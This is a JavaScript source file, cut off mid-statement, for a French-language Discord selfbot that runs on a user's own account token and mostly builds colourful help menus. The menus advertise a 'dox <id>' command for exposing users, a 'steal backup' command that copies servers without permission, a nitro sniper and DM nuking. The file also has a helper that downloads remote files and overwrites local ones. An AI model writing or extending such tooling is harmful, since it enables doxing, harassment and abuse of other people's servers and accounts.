// Require
const consolecolor = require('gradient-string')
const snekfetch = require('snekfetch')
const fs = require('fs')
const express = require('express')
const request = require("request")
const ms = require("ms")
const app = express()
require('dotenv').config()
const backup = require("discord-backup");
const { channel } = require('diagnostics_channel')
backup.setStorageFolder(__dirname+"/backups/");

app.get('/', function (req, res) {
  res.send('Hello shadow')
})




app.listen(3000)
snekfetch.get('https://api.npoint.io/a98dafe0fd0029dcdc74').then(r => {
  let ver = "1.0.4"
  let version = r.body.version
  let ksch = r.body.createur
  
  let consoleytb = r.body.chaine
  let consolediscord = r.body.discord

  let botcertified = r.body.bots

  let helpver = ver
  if (version === ver){}
  else helpver = ver + "\n\nNouvelle version disponnible: " + version

  
let newver = " "

if (version.includes(ver)){} else newver = `[#] Nouvelle version: ${version} disponnible !`

// Config
let config = require('./config.json')
let token = config.token
let prefix = config.prefix
let color = config.color
let yourgif = config.yourgif
let nsfw = config.nsfw

// Rpc
let boutonurl2 = config.boutonurl2
let boutontexte2 = config.boutontexte2
let boutonurl = config.boutonurl
let boutontexte = config.boutontexte
let rpcimage = config.rpcimage
let ligne1 = config.ligne1
let titre = config.titre
let ligne2 = config.ligne2
let timestamp = config.time
let rpc = config.rpc

if (!token) token = process.env.token




// Clients
const { Client, Discord, WebEmbed, CustomStatus, Application, ApplicationCommandManager, RichPresence, CommandInteractionOptionResolver } = require('discord.js-selfbot-v13');
const client = new Client({
  checkUpdate: false,
}); 
let nsfwmenu = ""
if (nsfw === "on" || nsfw === "On") nsfwmenu = " "
 else nsfwmenu = '|「Désactivé」'

if (!color) color = "BLACK"

if (!yourgif) yourgif = "https://i.pinimg.com/originals/50/c5/f1/50c5f1847013012ee0f25f67fdddb8d9.gif"

client.login(token);
client.on('error', (error) => console.log(error))
client.on('reconnection', () => console.log("reconnexion en cours..."))
client.on('disconnect', () => console.log("deconnexion en cours..."))

commandIntervals = [];
webhookIntervals = [];




// Création de fichiers
if (!fs.existsSync("./Data")) fs.mkdirSync("./Data");

if (!fs.existsSync("./Data/bl.json")) fs.writeFileSync(`./Data/bl.json`, '{"users": []}');

if (!fs.existsSync("./Data/copy.json")) fs.writeFileSync(`./Data/copy.json`, '{"channel": "",\n"user": ""}');

if (!fs.existsSync("./Data/grp.json")) fs.writeFileSync(`./Data/grp.json`, '{}');

if (!fs.existsSync("./Data/crow.json")) fs.writeFileSync(`./Data/crow.json`, '{"users": []}');

if (!fs.existsSync("./Data/qf.json")) fs.writeFileSync(`./Data/qf.json`, '{}');

if (!fs.existsSync("./Data/embed.json")) fs.writeFileSync(`./Data/embed.json`, '{"embed": "on"}');

if (!fs.existsSync("./Data/sleepcall.json")) fs.writeFileSync(`./Data/sleepcall.json`, '{}');

if (!fs.existsSync("./Data/grp.json")) fs.writeFileSync(`./Data/grp.json`, '{"groupe": "off"}')

if (!fs.existsSync("./Data/pubmp.json")) fs.writeFileSync(`./Data/pubmp.json`, '{}');

if (!fs.existsSync("./Data/vkick.json")) fs.writeFileSync(`./Data/vkick.json`, '{}');
          
if (!fs.existsSync("./Data/crowguild.json")) fs.writeFileSync(`./Data/crowguild.json`, '{"guilds": []}');

if (!fs.existsSync("./Data/copy.json")) fs.writeFileSync(`./Data/copy.json`, '{}');

if (!fs.existsSync("./Data/copychannel.json")) fs.writeFileSync(`./Data/copychannel.json`, '{}');

if (!fs.existsSync("./Data/crowsecur.json")) fs.writeFileSync(`./Data/crowsecur.json`, '{\n"antiping": "off",\n"antiwebhook": "off",\n"antilink": "off",\n"antichannel": "on",\n"antirole": "on",\n"antibot": "on",\n"antiban": "on",\n"antikick": "on",\n"antiupdate": "on"\n}');

if (!fs.existsSync("./Data/afk.json")) fs.writeFileSync(`./Data/afk.json`, '{}');

if (!fs.existsSync("./Data/afk.json")) fs.writeFileSync(`./Data/afk.json`, '{}');

if (!fs.existsSync("./Data/nitrosnipe.json")) fs.writeFileSync(`./Data/nitrosnipe.json`, '{"nitro": "on"}');

let console2 = ["yellow", "orange", "green"];
let console1 = Math.floor((Math.random() * console2.length));

let console3 = ["white", "red", "blue", "magenta"];
let console4 = Math.floor((Math.random() * console3.length));

let consolelogo = [
` _______  __   __  _______  ___      __   __  _______  ___   _______  __    _ 
|       ||  | |  ||       ||   |    |  | |  ||       ||   | |       ||  |  | |
|    ___||  |_|  ||   _   ||   |    |  | |  ||_     _||   | |   _   ||   |_| |
|   |___ |       ||  | |  ||   |    |  |_|  |  |   |  |   | |  | |  ||       |
|    ___||       ||  |_|  ||   |___ |       |  |   |  |   | |  |_|  ||  _    |
|   |___  |     | |       ||       ||       |  |   |  |   | |       || | |   |
|_______|  |___|  |_______||_______||_______|  |___|  |___| |_______||_|  |__|`,
`
███████╗██╗   ██╗ ██████╗ ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
██╔════╝██║   ██║██╔═══██╗██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
█████╗  ██║   ██║██║   ██║██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
██╔══╝  ╚██╗ ██╔╝██║   ██║██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
███████╗ ╚████╔╝ ╚██████╔╝███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
╚══════╝  ╚═══╝   ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝`,
`
▓█████ ██▒   █▓ ▒█████   ██▓     █    ██ ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
▓█   ▀▓██░   █▒▒██▒  ██▒▓██▒     ██  ▓██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒███   ▓██  █▒░▒██░  ██▒▒██░    ▓██  ▒██░▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒▓█  ▄  ▒██ █░░▒██   ██░▒██░    ▓▓█  ░██░░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
░▒████▒  ▒▀█░  ░ ████▓▒░░██████▒▒▒█████▓   ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
░░ ▒░ ░  ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▓  ░░▒▓▒ ▒ ▒   ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ░  ░  ░ ░░    ░ ▒ ▒░ ░ ░ ▒  ░░░▒░ ░ ░     ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
   ░       ░░  ░ ░ ░ ▒    ░ ░    ░░░ ░ ░   ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░  ░     ░      ░ ░      ░  ░   ░               ░      ░ ░           ░`,
`
▄▄▄ . ▌ ▐·      ▄▄▌  ▄• ▄▌▄▄▄▄▄▪         ▐ ▄ 
▀▄.▀·▪█·█▌▪     ██•  █▪██▌•██  ██ ▪     •█▌▐█
▐▀▀▪▄▐█▐█• ▄█▀▄ ██▪  █▌▐█▌ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌
▐█▄▄▌ ███ ▐█▌.▐▌▐█▌▐▌▐█▄█▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌
 ▀▀▀ . ▀   ▀█▄▀▪.▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪`,
`
▄███▄      ▄   ████▄ █       ▄     ▄▄▄▄▀ ▄█ ████▄    ▄   
█▀   ▀      █  █   █ █        █ ▀▀▀ █    ██ █   █     █  
██▄▄   █     █ █   █ █     █   █    █    ██ █   █ ██   █ 
█▄   ▄▀ █    █ ▀████ ███▄  █   █   █     ▐█ ▀████ █ █  █ 
▀███▀    █  █            ▀ █▄ ▄█  ▀       ▐       █  █ █ 
          █▐                ▀▀▀                   █   ██ 
          ▐                                              `,
`
 ********                    **           **   **                  
/**/////                    /**          /**  //                   
/**       **    **  ******  /** **   ** ****** **  ******  ******* 
/******* /**   /** **////** /**/**  /**///**/ /** **////**//**///**
/**////  //** /** /**   /** /**/**  /**  /**  /**/**   /** /**  /**
/**       //****  /**   /** /**/**  /**  /**  /**/**   /** /**  /**
/********  //**   //******  ***//******  //** /**//******  ***  /**
////////    //     //////  ///  //////    //  //  //////  ///   // `]
let sltcv = Math.floor((Math.random() * consolelogo.length));

client.on('ready', () => { 

  if (client.user.premium > 0) {
    var nitroyn = ('actif');
} else {
    var nitroyn = ("non")
}

if (client.user.bot) {
    var botyn = (`oui`);
    process.exit(1)
} else {
    var botyn = (`non`)
}


  console.clear()
  console.log(consolecolor.passion(`${consolelogo[sltcv]}                                           
------------------------------------------------------------------------------------------------------------------------
`))

console.log(consolecolor(console2[console1], console3[console4])(`
          [#] Version: ${ver}   
          [#] Prefix: ${prefix}
          [#] Connecter sur: ${client.user.username}
          [#] ID: ${client.user.id}
          [#] Bot: ${botyn}
          [#] Nitro: ${nitroyn}
          [#] Nombre de serveurs: ${client.guilds.cache.size}
          [#] Nombre de salons: ${client.channels.cache.size}
          [#] Nombre de membres: ${client.users.cache.size}
          [#] Nitro Auto Claim: Désactivé
          [#] Chaine: ${consoleytb}
          [#] Discord: ${consolediscord}
          ${newver}

`))

})




// Functions
function print(a) {
  console.log(`${a}`);
}


function sleep(delay) {
var start = new Date().getTime();
while (new Date().getTime() < start + delay);
}




function UpdateFile(FileName, Link) {
let a = FileName;
let b = Link;
fs.unlink(`./${a}`, function(err) {
    if (err && err.code == 'ENOENT') {
        // file doens't exist
        console.info("Un fichier n'existe pas, ne fermez pas la fenetre je vais l'installer.");
    } else if (err) {
        // other errors, e.g. maybe we don't have enough permission
        console.error("Une erreur s'est produite lors de la tentative de suppression du fichier".bgred);
    } else {
        //continue
    }
});
var file = fs.createWriteStream(`./${a}`);
var r = request(`${b}`).pipe(file);
r.on('error', function(err) {
    console.log(err);
});
r.on('finish', function() {
    file.close(sleep(1));
});
}




function makeID(len) {
  var returned = '';
  var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var length = chars.length;
  for (var i = 0; i < len; i++) {
      returned += chars.charAt(Math.floor(Math.random() * length));
  }
  return returned

}

client.on('messageCreate', async (message) => {
  let afk = require("./Data/afk.json")
let db = require("./Data/sleepcall.json")
let bl = require("./Data/bl.json")
const grp = require('./Data/grp.json')
const sleepcall = require('./Data/sleepcall.json')
  let copy = require('./Data/copy.json')
  let copychannel = require('./Data/copychannel.json')
  let crow = require('./Data/crow.json')
  let crowserv = require('./Data/crowguild.json')
  let crowsecur = require('./Data/crowsecur.json')
  let nitrosniper = require('./Data/nitrosnipe.json')
  function savesecur() {
    fs.writeFile("./Data/crowsecur.json", JSON.stringify(crowsecur), err => {
        if (err) console.log(err);
    });
  }
  function savesleep() {
    fs.writeFile("./Data/sleepcall.json", JSON.stringify(sleepcall), err => {
        if (err) console.log(err);
    });
  }
  function savecopy() {
    fs.writeFile("./Data/copy.json", JSON.stringify(copy), err => {
        if (err) console.log(err);
    });
  }  function savecopychannel() {
    fs.writeFile("./Data/copychannel.json", JSON.stringify(copychannel), err => {
        if (err) console.log(err);
    });
  }

  function savecrow() {
    fs.writeFile("./Data/crow.json", JSON.stringify(crow), err => {
        if (err) console.log(err);
    });
  }

  function saver() {
    fs.writeFile("./Data/pubmp.json", JSON.stringify(db), err => {
        if (err) console.log(err);
    });
  }
  
  
  
  function savebl() {
    fs.writeFile("./Data/bl.json", JSON.stringify(bl), err => {
        if (err) console.error(err);
    });
  }
  
  function saving() {
    fs.writeFile("./Data/afk.json", JSON.stringify(afk), err => {
        if (err) console.error(err);
    });
  }
  

  function savecrowserv() {
    fs.writeFile("./Data/crowguild.json", JSON.stringify(crowserv), err => {
        if (err) console.log(err);
    });
  }

  function savegrp() {
    fs.writeFile("./Data/qf.json", JSON.stringify(grp), err => {
        if (err) console.log(err);
    });
  }

if (message.author.id !== client.user.id) return;
if (afk[client.user.id]){
  if (message.content.startsWith(":x: ")) return;
  else delete afk[client.user.id];
  saving();
  message.channel.send("**AFK enlevé**")
}













const nonsfw = (":x: **Tu n'as pas activé les commandes nsfw**")
let emode = require("./Data/embed.json")
if (emode["embed"] === "on"){
var helpprofile = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝚘𝚗𝚕𝚒𝚗𝚎

${prefix}𝚒𝚍𝚕𝚎

${prefix}𝚍𝚗𝚍

${prefix}𝚘𝚏𝚏𝚕𝚒𝚗𝚎

${prefix}𝚌𝚜𝚝𝚊𝚝𝚞𝚜 <𝚝𝚎𝚡𝚝>

${prefix}𝚗𝚒𝚌𝚔 <𝚝𝚎𝚡𝚝>

${prefix}𝚒𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎𝚗𝚒𝚌𝚔

${prefix}𝚓𝚞𝚗𝚔𝚗𝚒𝚌𝚔`)
.setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('🐱‍🐉Pannel de menu profile (shadow)🐱‍🐉')
.setURL('@everyone\https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
  var helpprofile = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
Pseudo        » ${client.user.username}
Tag           » ${client.user.discriminator}
Nom           » ${client.user.username}`+"``````ansi\n"+
  `${prefix}online        » Te met en ligne
${prefix}idle           » Te rend inactif
${prefix}dnd            » Ne pas déranger
${prefix}offline        » Te rend hors ligne
${prefix}status [35m<text>[0m  » Changer ton status
${prefix}cstatus        » Supprime ton status`
  +"``````ansi\n" +
  `${prefix}nick [35m<text>[0m   » Change ton pseudo
${prefix}invisiblenick    » Met pseudo invisible
${prefix}junknick         » Met un nom junks`
  +"```"}
if (emode["embed"] === "on"){
  var helptroll = new WebEmbed()
    .setColor(color)
    .setDescription(`${prefix}𝐠𝐡𝐨𝐬𝐭𝐩𝐢𝐧𝐠 <@ping>
    
${prefix}𝐯𝐢𝐝𝐞
    
${prefix}𝐜𝐨𝐩𝐲
        
${prefix}𝐦𝐫𝐞𝐚𝐜𝐭

${prefix}𝐧𝐢𝐜𝐤

${prefix}𝐢𝐧𝐯𝐢𝐬𝐢𝐛𝐥𝐞𝐧𝐢𝐜𝐤

${prefix}𝐣𝐮𝐧𝐤𝐧𝐢𝐜𝐤

    `)
      .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
    .setTitle('Pannel du menu help de shadow')
    .setURL('https://discord.gg/3ScUGWWEv7')
    .setImage(yourgif)
}
if (emode["embed"] === "on"){
  var help = new WebEmbed()
    .setColor(color)
    .setDescription(`${prefix}𝐡𝐞𝐥𝐩
    
${prefix}𝐮𝐬𝐞𝐫

${prefix}paypal

${prefix}dox <id>

${prefix}token
    
${prefix}𝐬𝐞𝐫𝐯𝐞𝐮𝐫
    
${prefix}𝐭𝐨𝐨𝐥
    
${prefix}𝐮𝐭𝐢𝐥
    
${prefix}𝐛𝐚𝐜𝐤𝐮𝐩𝐬

${prefix}𝐬𝐭𝐚𝐭𝐮𝐬

${prefix}𝐧𝐬𝐟𝐰 ${nsfwmenu}

${prefix}𝐩𝐞𝐫𝐦

${prefix}𝐜𝐫𝐨𝐰

${prefix}𝐩𝐫𝐨𝐟𝐢𝐥𝐞
    `)
      .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
    .setTitle('Pannel de menu help de shadow')
    .setURL('https://discord.gg/osint')
    .setImage(yourgif)
  }
  else{
    var help = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
    made in shadow®
${prefix}help    » See all order categories
${prefix}user    » See all user related commands
${prefix}dox     » Dox someone with a id
${prefix}paypal  » displays shadow paypal
${prefix}token   » displays shadow token
${prefix}server  » Display useful commands for a server
${prefix}tool    » the list of tool commands
${prefix}util    » All useful commands
${prefix}backup  » Create, load and view backup info easily
${prefix}status  » Change status, delete it and more
${prefix}nsfw    » Show NSFW commands ${nsfwmenu}
${prefix}perms   » The perms commands are there to facilitate permissions
${prefix}crow    » Display crowbots commands to secure your server
${prefix}profile » Show profiles commands for custom ton profile`+"``````ansi\nVersion\n\n"+helpver+"```"
  }
  if (emode["embed"] === "on"){
var helpcrow =  new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝐩𝐠𝐮𝐢𝐥𝐝𝐬 <𝐢𝐝>
${prefix}𝐫𝐠𝐮𝐢𝐥𝐝𝐬 <𝐢𝐝>
${prefix}𝐰𝐡𝐢𝐭𝐞𝐥𝐢𝐬𝐭 <𝐢𝐝>
${prefix}𝐜𝐥𝐞𝐚𝐫 𝐰𝐥
${prefix}𝐮𝐧𝐰𝐡𝐢𝐭𝐞𝐥𝐢𝐬𝐭 <𝐢𝐝>
${prefix}𝐚𝐧𝐭𝐢𝐛𝐨𝐭 <𝐨𝐧/𝐨𝐟𝐟>
${prefix}𝐚𝐧𝐭𝐢𝐛𝐚𝐧 <𝐨𝐧/𝐨𝐟𝐟>
${prefix}𝐚𝐧𝐭𝐢𝐜𝐡𝐚𝐧𝐧𝐞𝐥 <𝐨𝐧/𝐨𝐟𝐟>
${prefix}𝐚𝐧𝐭𝐢𝐫𝐨𝐥𝐞 <𝐨𝐧/𝐨𝐟𝐟>
${prefix}𝐚𝐧𝐭𝐢𝐩𝐢𝐧𝐠 <𝐨𝐧/𝐨𝐟𝐟>
${prefix}𝐚𝐧𝐭𝐢𝐥𝐢𝐧𝐤 <𝐨𝐧/𝐨𝐟𝐟>
`)
  .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('🦅Pannel de menu crow🦅')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
  }
  else{
    var helpcrow = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}pguilds [35m<id>[0m      » Ajoute un serveur a la sécurisation
${prefix}rguilds [35m<id>[0m      » Retire un serveur de la securisation
${prefix}whitelist [35m<id>[0m    » Whitelist un membre
${prefix}unwhitelist [35m<id>[0m  » Enlève un membre de la whitelist`+"``````ansi\n" + 
`${prefix}antibot [35m<on/off>[0m      » Active ou désactive l'anti join de bots
${prefix}antiban [35m<on/off>[0m       » Active ou désactive les bannissements
${prefix}antichannel [35m<on/off>[0m   » Active ou désactive la création de salons
${prefix}antirole [35m<on/off>[0m      » Active ou désactive la création de rôles
${prefix}antiping [35m<on/off>[0m      » Active ou désactive les pings
${prefix}antilink [35m<on/off>[0m      » Active ou désactive les liens discords`
 + "```"
  }
if (emode["embed"] === "on"){
  var helpbackup = new WebEmbed()
  .setColor(color)
  .setDescription(`${prefix}𝐜𝐫𝐞𝐚𝐭𝐞 𝐛𝐚𝐜𝐤𝐮𝐩

${prefix}𝐬𝐭𝐞𝐚𝐥 𝐛𝐚𝐜𝐤𝐮𝐩

${prefix}𝐥𝐨𝐚𝐝 𝐛𝐚𝐜𝐤𝐮𝐩
  
${prefix}𝐥𝐢𝐬𝐭 𝐛𝐚𝐜𝐤𝐮𝐩
  
${prefix}𝐢𝐧𝐟𝐨 𝐛𝐚𝐜𝐤𝐮𝐩
  `)
    .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
  .setTitle('⚙Pannel de menu backups⚙')
  .setURL('https://discord.gg/3ScUGWWEv7')
  .setImage(yourgif)
}
else{
  var helpbackup = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}create backup     » Créé une backup du serveur
${prefix}load backup       » Charge un backup (create by anonyme#4747)
${prefix}steal backup      » Créé une backup du serveur sans permissions
${prefix}list backup       » Affiche la liste des backups
${prefix}info backup [35m<id>[0m  » Envoie toutes les infos de la backup`+"```"
}
if (emode["embed"] === "on"){

const helpstatus = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝐛𝐥𝐚𝐜𝐤 𝐜𝐥𝐨𝐯𝐞𝐫

${prefix}𝐨𝐧𝐞 𝐩𝐢𝐞𝐜𝐞

${prefix}𝐡𝐱𝐡

${prefix}𝐩𝐨𝐫𝐧𝐡𝐮𝐛

${prefix}𝐬𝐭𝐫𝐞𝐚𝐦 (𝐭𝐞𝐱𝐭)

${prefix}𝐣𝐨𝐮𝐞 (𝐭𝐞𝐱𝐭)

${prefix}𝐞𝐜𝐨𝐮𝐭𝐞 (𝐭𝐞𝐱𝐭)

${prefix}𝐫𝐞𝐠𝐚𝐫𝐝𝐞 (𝐭𝐞𝐱𝐭)

${prefix}𝐩𝐚𝐫𝐭𝐢𝐜𝐢𝐩𝐞 (𝐭𝐞𝐱𝐭)

${prefix}𝐫𝐞𝐬𝐞𝐭
`)
  .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('🎭Pannel de menu Status🎭')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
  var helpstatus = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}black clover [34m[texte][0m » Avoir un status black clover
${prefix}shadow [34m[texte][0m         » Change ton status pour shadow le bg
${prefix}one piece [34m[texte][0m    » Avoir un status one piece
${prefix}hxh [34m[texte][0m          » Avoir un status hunter x hunter
${prefix}pornhub [34m[texte][0m      » Envoie toutes les infos de la backup
${prefix}stream [34m[texte][0m       » Change ton status en stream
${prefix}joue [34m[texte][0m         » Change ton status pour jouer
${prefix}ecoute [34m[texte][0m       » Change ton status pour écouter
${prefix}regarde [34m[texte][0m      » Change ton status pour regarder
${prefix}participe [34m[texte][0m    » Change ton status pour participer 
${prefix}reset                » Supprime ton status`+"```"
}
if (emode["embed"] === "on"){
var helpperm = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝐩𝐞𝐫𝐦 𝐬𝐞𝐧𝐝 <@𝐫𝐨𝐥𝐞>

${prefix}𝐮𝐧𝐩𝐞𝐫𝐦 𝐬𝐞𝐧𝐝 <@𝐫𝐨𝐥𝐞>

${prefix}𝐩𝐞𝐫𝐦 𝐢𝐦𝐚𝐠𝐞 <@𝐫𝐨𝐥𝐞>

${prefix}𝐮𝐧𝐩𝐞𝐫𝐦 𝐢𝐦𝐚𝐠𝐞 <@𝐫𝐨𝐥𝐞>

${prefix}𝐩𝐞𝐫𝐦 𝐯𝐨𝐜 <@𝐫𝐨𝐥𝐞>

${prefix}𝐮𝐧𝐩𝐞𝐫𝐦 𝐯𝐨𝐜 <@𝐫𝐨𝐥𝐞>

${prefix}𝐩𝐞𝐫𝐦 𝐚𝐥𝐥 <@𝐫𝐨𝐥𝐞>

${prefix}𝐮𝐧𝐩𝐞𝐫𝐦 𝐚𝐥𝐥 <@𝐫𝐨𝐥𝐞>
`)
  .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('Pannel de menu perm ⛓')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
var helpperm = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}perm send [35m<role>[0m     » Donner la perm d'envoyer des messages
${prefix}unperm send [35m<role>[0m   » Enlever la perm d'envoyer des messages
${prefix}perm image [35m<role>[0m    » Configuer le rôle image
${prefix}unperm image [35m<role>[0m  » Déconfigurer la perm image
${prefix}perm voc [35m<role>[0m      » Donner les perms voc à un rôle
${prefix}unperm voc [35m<role>[0m    » Enlever les perms voc à un rôle
${prefix}perm all [35m<role>[0m      » Donner toutes les perms
${prefix}unperm all [35m<role>[0m    » Enlever toutes les perms`+"```"
}

if (emode["embed"] === "on"){
var helpuser = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝐬𝐞𝐭 𝐛𝐢𝐨 <𝐧𝐨𝐮𝐯𝐞𝐥𝐥𝐞 𝐛𝐢𝐨>
${prefix}𝐜𝐡𝐚𝐧𝐠𝐞 𝐡𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 <𝐛𝐫𝐚𝐯𝐞𝐫𝐲/𝐛𝐫𝐢𝐥𝐥𝐚𝐧𝐜𝐞/𝐛𝐚𝐥𝐚𝐧𝐜𝐞/𝐥𝐞𝐚𝐯𝐞>
${prefix}𝐬𝐞𝐭 𝐚𝐯𝐚𝐭𝐚𝐫 <𝐮𝐫𝐥>
${prefix}𝐬𝐞𝐭 𝐧𝐨𝐭𝐞 <@user> <note>
${prefix}𝐬𝐞𝐭 𝐛𝐚𝐧𝐧𝐢è𝐫𝐞 <𝐮𝐫𝐥>
${prefix}𝐜𝐡𝐚𝐧𝐠𝐞 𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝 <𝐚𝐧𝐜𝐢𝐞𝐧 𝐦𝐨𝐭 𝐝𝐞 𝐩𝐚𝐬𝐬𝐞> <𝐧𝐨𝐮𝐯𝐞𝐚𝐮 𝐦𝐨𝐭 𝐝𝐞 𝐩𝐚𝐬𝐬𝐞>
${prefix}𝐜𝐡𝐚𝐧𝐠𝐞 𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞 <𝐦𝐨𝐭 𝐝𝐞 𝐩𝐚𝐬𝐬𝐞> <𝐭𝐨𝐧 𝐩𝐬𝐞𝐮𝐝𝐨>
${prefix}𝐜𝐡𝐚𝐧𝐠𝐞 𝐞𝐦𝐚𝐢𝐥 <𝐞𝐦𝐚𝐢𝐥> <𝐦𝐨𝐭 𝐝𝐞 𝐩𝐚𝐬𝐬𝐞>
${prefix}𝐬𝐞𝐭 𝐝𝐢𝐬𝐜𝐫𝐢𝐦𝐢𝐧𝐚𝐭𝐨𝐫 <𝐭𝐚𝐠> <𝐦𝐨𝐭 𝐝𝐞 𝐩𝐚𝐬𝐬𝐞>
${prefix}𝐝𝐞𝐥𝐞𝐭𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 |「 New 」
`)
.setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('Pannel de menu user 👥')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
var helpuser = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}change hypesquad [35m<house/leave>[0m         » Changer de maison de hypesquad
${prefix}set bio [35m<bio>[0m                          » Modifie ta bio depuis le bot
${prefix}set avatar [35m<url>[0m                       » Change ton avatar
${prefix}set note [35m<user>[0m [35m<note>[0m                 » Ajouter une note à quelqu'un
${prefix}set banniere [35m<url>[0m                     » Change ta bannière (nitro)
${prefix}change password [35m<ancien>[0m [35m<nouveau>[0m     » Change ton mot de passe
${prefix}change email [35m<email>[0m [35m<mot de passe>[0m    » Modifie ton email
${prefix}set tag [35m<tag>[0m [35m<mot de passe>[0m           » Change ton #0000 (nitro)
${prefix}delete account                         » Supprime ton compte`+"```"
}

if (emode["embed"] === "on"){
var helpdox = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}dox <user id>

${prefix}dox <id>
    `)
  .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('Pannel de menu dox ⛓')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
  var helpdox = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}dox         »      dox user with the command : ,dox (user.id)`+"```"
  }

if (emode["embed"] === "on"){
var helputil = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝐦𝐚𝐬𝐬𝐫𝐨𝐥𝐞 <𝐚𝐝𝐝/𝐫𝐞𝐦𝐨𝐯𝐞> @𝐫𝐨𝐥𝐞

${prefix}𝐫𝐞𝐧𝐞𝐰 (#𝐜𝐡𝐚𝐧𝐧𝐞𝐥/𝐚𝐥𝐥)

${prefix}𝐥𝐨𝐜𝐤 (#𝐜𝐡𝐚𝐧𝐧𝐞𝐥)

${prefix}𝐮𝐧𝐥𝐨𝐜𝐤 (#𝐜𝐡𝐚𝐧𝐧𝐞𝐥)

${prefix}𝐯𝐨𝐢𝐜𝐞 (𝐚𝐥𝐥)

${prefix}𝐝𝐞𝐫𝐚𝐧𝐤 <@user>

${prefix}𝐬𝐭𝐚𝐫𝐭𝐮𝐩

${prefix}𝐧𝐮𝐤𝐞 𝐝𝐦
    `)
  .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
.setTitle('Pannel de menu util 🌐')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
  var helputil = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}massrole <add/remove> <role>  » Ajoute ou retire un rôle
${prefix}renew [#channel/all]          » Refait tout le salon
${prefix}lock [#channel/all]           » Vérouille un ou tous les salons
${prefix}unlock [#channel/all]         » Dévérouille un ou tous les salons
${prefix}voice [all]                   » Affiche les informations vocales
${prefix}derank <user>                 » Enlève tous les rôle d'un membre
${prefix}startup                       » Modifie les permissions des rôles
${prefix}nukedm                        » Ferme tout tes mps`+"```"
  }
if (emode["embed"] === "on"){
var helpnsfw = new WebEmbed()
.setColor(color)
.setDescription(`${prefix}𝗔𝘀𝘀

${prefix}𝗽𝘂𝘀𝘀𝘆

${prefix}𝗻𝘀𝗳𝘄-𝗴𝗶𝗳

${prefix}𝗮𝗻𝗮𝗹

${prefix}𝘁𝗵𝗶𝗴𝗵

${prefix}𝟰𝗸

${prefix}𝗵𝗲𝗻𝘁𝗮𝗶

`)
.setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
